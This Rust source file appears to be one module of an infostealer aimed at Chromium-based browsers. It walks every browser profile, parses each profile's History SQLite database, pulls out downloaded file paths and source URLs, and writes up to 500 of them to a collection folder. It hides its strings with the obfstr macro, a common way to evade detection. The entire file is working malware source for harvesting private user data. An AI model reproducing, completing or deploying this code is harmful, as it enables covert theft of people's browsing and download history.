use alloc::borrow::ToOwned;
use alloc::boxed::Box;
use alloc::string::{String, ToString};
use alloc::sync::Arc;
use alloc::vec::Vec;
use tasks::Task;
use utils::path::{Path, WriteToFile};
use crate::chromium::Browser;
use crate::Download;
use obfstr::obfstr as s;
use sqlite::{read_sqlite3_database_by_bytes, TableRecord, TableRecordExtension};

const DOWNLOADS_CURRENT_PATH: usize = 2;
const DOWNLOADS_TAB_URL: usize      = 16;

pub(super) struct DownloadsTask {
    browser: Arc<Browser>
}

impl DownloadsTask {
    pub(super) fn new(browser: Arc<Browser>) -> Self {
        Self { browser }
    }
}

impl Task for DownloadsTask {
    unsafe fn run(&self, parent: &Path) {
        let mut downloads: Vec<Download> = self.browser
            .profiles
            .iter()
            .filter_map(|profile| get_downloads(profile))
            .flat_map(|v| v.into_iter())
            .collect();

        if downloads.is_empty() {
            return
        }

        downloads.sort();
        downloads.dedup();

        downloads.truncate(500);

        let _ = downloads
            .iter()
            .map(|download| download.to_string())
            .collect::<Vec<String>>()
            .join("\n\n")
            .write_to(parent);
    }
}

fn get_downloads(profile: &Path) -> Option<Vec<Download>> {
    let history_path = profile / s!("History");
    let bytes = history_path.read_file().ok()?;

    let db = read_sqlite3_database_by_bytes(&bytes)?;
    let table = db.read_table(s!("Downloads"))?;

    let downloads = table
        .filter_map(|record| extract_download_from_record(&record))
        .collect();

    Some(downloads)
}

fn extract_download_from_record(record: &Box<dyn TableRecord>) -> Option<Download> {
    let saved_as = record.get_value(DOWNLOADS_CURRENT_PATH)?.as_string()?.to_owned();
    let url = record.get_value(DOWNLOADS_TAB_URL)?.as_string()?.to_owned();

    Some(Download {
        saved_as,
        url
    })
}